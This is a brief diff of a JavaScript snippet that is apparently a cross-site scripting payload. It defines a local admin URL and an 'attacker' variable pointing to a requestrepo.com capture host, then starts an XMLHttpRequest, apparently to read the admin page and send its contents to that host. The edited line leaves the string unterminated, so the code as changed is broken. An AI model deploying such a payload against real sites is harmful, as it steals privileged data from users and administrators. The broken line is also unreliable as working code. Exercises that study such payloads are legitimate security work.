@@ -1,6 +1,6 @@
 
 var url = "http://localhost:1337/admin";
-var attacker = "hhttp://qy7yegjk.requestrepo.com";
+var attacker = "http://qy7yegjk.requestrepo.com;
 var xhr  = new XMLHttpRequest();
 xhr.onreadystatechange = function() {
     if (xhr.readyState == XMLHttpRequest.DONE) {
